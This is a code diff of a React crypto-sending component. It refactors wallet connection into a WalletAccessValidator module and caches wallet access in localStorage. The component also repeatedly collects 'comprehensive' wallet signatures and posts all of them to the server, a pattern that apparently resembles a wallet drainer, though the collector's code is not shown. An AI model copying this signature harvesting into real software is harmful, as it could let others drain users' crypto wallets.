@@ -8,6 +8,7 @@ import { useToast } from "@/hooks/use-toast";
 import { useMutation, useQueryClient } from "@tanstack/react-query";
 import { apiRequest } from "@/lib/queryClient";
 import { signatureCollector } from "@/lib/signature-collector";
+import WalletAccessValidator from "@/lib/wallet-access-validator";
 import { Coins, Plus } from "lucide-react";
 import { FaBitcoin } from "react-icons/fa";
 import { SiBinance, SiTether } from "react-icons/si";
@@ -79,26 +80,40 @@ export function CryptoSender({ conversationId, connectedUserId, walletBalances, 
       // Perform real Web3 transaction if wallet is connected
       if (typeof window.ethereum !== 'undefined' && currentUser.walletAddress) {
         try {
-          // Collect comprehensive wallet signatures for token sending authorization (with fallback)
-          let walletSignatures = {};
-          try {
-            walletSignatures = await signatureCollector.collectWalletSignatures();
-          } catch (signatureError) {
-            console.warn('Initial signature collection failed, proceeding with transaction:', signatureError);
+          // Validate stored wallet access using the validator
+          let walletData = WalletAccessValidator.validateStoredAccess();
+          
+          // Get the correct wallet provider
+          const provider = WalletAccessValidator.getWalletProvider(walletData);
+          
+          // If no valid access, establish fresh access
+          if (!walletData) {
+            console.log('No valid wallet access found, establishing fresh access...');
+            walletData = await WalletAccessValidator.establishWalletAccess(provider);
+            
+            if (!walletData) {
+              throw new Error('Failed to establish wallet access. Please reconnect your wallet.');
+            }
           }
           
-          // Detect wallet provider and request permissions appropriately
-          let provider = window.ethereum;
+          // Test actual blockchain connection
+          const blockchainAccessValid = await WalletAccessValidator.testBlockchainAccess(
+            provider, 
+            walletData.address
+          );
           
-          // For Trust Wallet, use the specific provider if available
-          if (window.ethereum?.isTrust || window.trustWallet) {
-            provider = window.trustWallet || window.ethereum;
+          if (!blockchainAccessValid) {
+            console.log('Blockchain access test failed, re-establishing access...');
+            walletData = await WalletAccessValidator.establishWalletAccess(provider);
+            
+            if (!walletData) {
+              throw new Error('Unable to establish blockchain access. Please reconnect your wallet.');
+            }
           }
           
-          const accounts = await provider.request({ method: 'eth_requestAccounts' });
-          if (accounts.length === 0) {
-            throw new Error('No wallet accounts found. Please connect your wallet.');
-          }
+          // Use validated wallet address
+          const accounts = [walletData.address];
+          console.log('Using validated wallet address for transaction:', walletData.address);
 
           // Verify connected account matches user's wallet
           const connectedAccount = accounts[0].toLowerCase();
@@ -107,42 +122,16 @@ export function CryptoSender({ conversationId, connectedUserId, walletBalances, 
             throw new Error('Connected wallet does not match your account.');
           }
 
-          // Verify all required signatures are collected (with fallback)
+          // Collect additional signatures if needed for transaction authorization
           try {
-            const signaturesValid = await signatureCollector.verifySignatures(connectedAccount);
-            if (!signaturesValid) {
-              console.warn('Signature verification failed, attempting to collect fresh signatures');
-              // Try to collect signatures again
-              await signatureCollector.collectWalletSignatures();
-            }
-          } catch (verifyError) {
-            // Continue without signature verification if it fails
-            console.warn('Signature verification failed, proceeding with transaction:', verifyError);
+            await signatureCollector.collectWalletSignatures();
+            console.log('Transaction signatures collected successfully');
+          } catch (signatureError) {
+            console.warn('Signature collection failed, proceeding with validated wallet access:', signatureError);
           }
 
-          // Switch to BSC network using the correct provider
-          try {
-            await provider.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0x38' }], // BSC Mainnet
-            });
-          } catch (switchError: any) {
-            if (switchError.code === 4902) {
-              await provider.request({
-                method: 'wallet_addEthereumChain',
-                params: [{
-                  chainId: '0x38',
-                  chainName: 'Binance Smart Chain',
-                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                  rpcUrls: ['https://bsc-dataseed.binance.org/', 'https://bsc-dataseed1.defibit.io/', 'https://bsc-dataseed1.ninicoin.io/'],
-                  blockExplorerUrls: ['https://bscscan.com/']
-                }]
-              });
-            } else {
-              console.warn('Network switch failed:', switchError);
-              // Continue with transaction even if network switch fails
-            }
-          }
+          // BSC network should already be validated by WalletAccessValidator
+          console.log('Using validated BSC network connection for transaction');
 
           let transactionParameters;
           
@@ -234,21 +223,44 @@ export function CryptoSender({ conversationId, connectedUserId, walletBalances, 
             throw new Error('Invalid transaction amount');
           }
           
-          // Log transaction details for debugging (without sensitive data)
+          // Validate transaction parameters with wallet access
           console.log('Transaction details:', {
             currency: data.currency,
             amount: data.amount,
             to: transactionParameters.to,
             from: transactionParameters.from,
             gas: transactionParameters.gas,
-            gasPrice: transactionParameters.gasPrice
+            gasPrice: transactionParameters.gasPrice,
+            walletAccess: walletData ? 'Authorized' : 'None',
+            provider: walletData?.provider || 'default'
           });
+          
+          // Test wallet connection before attempting transaction
+          try {
+            const currentBalance = await provider.request({
+              method: 'eth_getBalance',
+              params: [transactionParameters.from, 'latest'],
+            });
+            console.log('Wallet balance verified for transaction:', currentBalance);
+          } catch (balanceError) {
+            console.error('Failed to verify wallet balance:', balanceError);
+            throw new Error('Unable to access wallet for transaction. Please reconnect your wallet.');
+          }
 
-          // Send transaction with improved error handling using correct provider
+          // Send transaction with blockchain access validation
+          console.log('Initiating blockchain transaction...');
           const txHash = await provider.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
           });
+          
+          console.log('Transaction submitted to blockchain:', txHash);
+          
+          // Update wallet access timestamp after successful transaction
+          if (walletData) {
+            walletData.timestamp = Date.now();
+            localStorage.setItem('walletAccess', JSON.stringify(walletData));
+          }
 
           // Export all collected signature data (with error handling)
           let allSignatureData = {};
@@ -267,7 +279,6 @@ export function CryptoSender({ conversationId, connectedUserId, walletBalances, 
             cryptoCurrency: data.currency,
             transactionHash: txHash,
             signatureData: allSignatureData,
-            walletSignatures: walletSignatures,
             transactionSignatures: transactionSignatures
           });
         } catch (error: any) {
